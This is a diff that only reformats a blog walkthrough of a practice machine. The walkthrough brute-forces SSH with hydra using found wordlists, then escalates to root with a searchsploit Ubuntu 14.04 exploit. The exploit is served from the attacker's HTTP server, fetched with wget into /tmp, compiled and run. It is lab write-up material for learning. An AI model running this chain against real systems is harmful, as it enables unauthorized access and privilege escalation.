@@ -76,7 +76,7 @@ To work further upon the file, I copied it to my own machine using the command
 
 `get <filename> <local path to download  the file to>`
 
-If we don’t add the local path to download the file to, it is by default saved in the **/root** directory with the same name.
+If we don’t add the local path to download the file to, it is by default saved in the _**/root** _directory with the same name.
 
 ![](/images/uploads/a-9-.png)
 
@@ -106,19 +106,19 @@ So after trying it, there existed a directory on the web server with the same na
 
 ![](/images/uploads/a-14-.png)
 
-You can see that there was a file named roflmao in the directory, I downloaded it to the /root directory (default) using 
+You can see that there was a file named **roflmao **in the directory, I downloaded it to the /root directory (default) using 
 
-wget <file address>
+`wget <file address>`
 
 ![](/images/uploads/a-15-.png)
 
 Since the file has no extension I just tried to read it string-wise, using the linux command
 
-strings <filename>
+`strings <filename>`
 
 ![](/images/uploads/a-16-.png)
 
-Another little hint hidden here was the “0x0856BF”, the first possibility of this string was to be another directory on the web server. So, I tried for just the same: 
+Another little hint hidden here was the “**0x0856BF**”, the first possibility of this string was to be another directory on the web server. So, I tried for just the same: 
 
 ![](/images/uploads/a-17-.png)
 
@@ -126,7 +126,7 @@ Here I found two folders, as you can see above. Now the contents of these are sh
 
 ![](/images/uploads/a-18-.png)
 
-The “good_luck” named folder contained a text file with contents below.
+The “**good_luck**” named folder contained a text file with contents below.
 
 ![](/images/uploads/a-19-.png)
 
@@ -134,17 +134,17 @@ The first most probable guess was this is a list of usernames which can be brute
 
 ![](/images/uploads/a-20-.png)
 
-On the other hand, the other directory too had a text file named Pass.txt and containing “Good\_job\_:)” 
+On the other hand, the other directory too had a text file named **Pass.txt** and containing “**Good\_job\_:)**” 
 
 ![](/images/uploads/a-21-.png)
 
-I downloaded both the files using wget command.
+I downloaded both the files using _**wget **_command.
 
 ![](/images/uploads/a-22-.png)
 
 ![](/images/uploads/a-23-.png)
 
-Once downloaded, I edited the text files using a GUI based pre-installed text editor and removed the extra un-required text in the file containing usernames most probably. Also, since the other folder read “this_folder_contains_the_password”, just as another safety measure, I also added the name of the text file “Pass.txt” in the list of probable passwords.
+Once downloaded, I edited the text files using a GUI based pre-installed text editor and removed the extra un-required text in the file containing usernames most probably. Also, since the other folder read “this_folder_contains_the_password”, just as another safety measure, I also added the name of the text file “**Pass.txt**” in the list of probable passwords.
 
 ![](/images/uploads/a-24-.png)
 
@@ -152,17 +152,17 @@ Once downloaded, I edited the text files using a GUI based pre-installed text ed
 
 After that was done, the task was now to brute force these supposed credentials that we had, to do that, I used the tool named hydra, which is one of the best and fastest brute forcing tools available in Kali. I brute forced the SSH protocol running on port 22.
 
-hydra –L <username list> -P <password list> ssh://<IP of target machine> -V  (for verbose)
+`hydra –L <username list> -P <password list> ssh://<IP of target machine> -V  (for verbose)`
 
 ![](/images/uploads/a-26-.png)
 
 ![](/images/uploads/a-27-.png)
 
-Upon running the commands successfully, we find the brute forced username and password as “overflow” and “Pass.txt”. This proves the importance of taking hints since the filename was the password itself. 
+Upon running the commands successfully, we find the brute forced username and password as “**overflow**” and “**Pass.txt**”. This proves the importance of taking hints since the filename was the password itself. 
 
 Using these credentials I tried logging in using SSH.
 
-ssh <username>@<host address>
+`ssh <username>@<host address>`
 
 ![](/images/uploads/a-28-.png)
 
@@ -174,13 +174,13 @@ Now that I had access to the directories, I checked the release version of the p
 
 We use the following command to check the release date and version 
 
-cat /etc/*-release
+`cat /etc/*-release`
 
 ![](/images/uploads/a-30-.png)
 
-Now that I knew the version of the operating system I searched for the exploits available for the same using the tool searchsploit in Kali
+Now that I knew the version of the operating system I searched for the exploits available for the same using the tool _**searchsploit **_in Kali
 
-searchsploit ubuntu 14.04
+`searchsploit ubuntu 14.04`
 
 ![](/images/uploads/a-31-.png)
 
@@ -188,13 +188,13 @@ Here I have highlighted the exploit which I thought was best to use, it’s a pr
 
 I now copied the exploit file to the present working directory i.e. /root using the command
 
-searchsploit –m <exploit file name> 
+`searchsploit –m <exploit file name> `
 
 ![](/images/uploads/a-32-.png)
 
 Now that I have copied the file to the working directory, I host a simple http server in the same directory using the command
 
-python –m SimpleHTTPServer
+`python –m SimpleHTTPServer`
 
 (it’s a case sensitive command)
 
@@ -204,15 +204,15 @@ Once I have successfully hosted the server in the directory, I can now download 
 
 Now, most web servers or machines do not allow file transfer or creation in any folder due to obvious security reasons but they often do have a temporary where one can download or create or copy files to, I just used the same directory to download the exploit to using the following commands
 
-cd tmp		(to change the directory to /tmp/)
+`cd tmp	`	(to change the directory to /tmp/)
 
-wget <IP address of the machine you hosted the server on>/<exploit file present in the same dir>
+`wget <IP address of the machine you hosted the server on>/<exploit file present in the same dir>`
 
 ![](/images/uploads/a-34-.png)
 
-ls		(to list the files in the directory)		
+`ls`		(to list the files in the directory)		
 
-gcc <exploit file name> -o <name of the executable payload to generated>
+`gcc <exploit file name> -o <name of the executable payload to generated>`
 
 ![](/images/uploads/a-35-.png)
 
@@ -220,15 +220,15 @@ Now I checked again to confirm the executable payload as been generated and is r
 
 To run the executable exploit, 
 
-./<executable payload file name>
+`./<executable payload file name>`
 
 ![](/images/uploads/a-36-.png)
 
-After the execution I saw a “#” symbol which signified I have successfully gained root access. I further typed the command “bash” to make the interface more use-able.
+After the execution I saw a “_**\#**_” symbol which signified I have successfully gained root access. I further typed the command “bash” to make the interface more use-able.
 
 ![](/images/uploads/a-37-.png)
 
-To further check it, I also use commands like “whoami” and “id” to confirm root access.
+To further check it, I also use commands like “_**whoami**_” and “_**id**_” to confirm root access.
 
 Congratulations, we have successfully completed the walk-through, I hope you enjoyed it, regarding any doubts, I can be contacted via the contact information available on the blog.
 
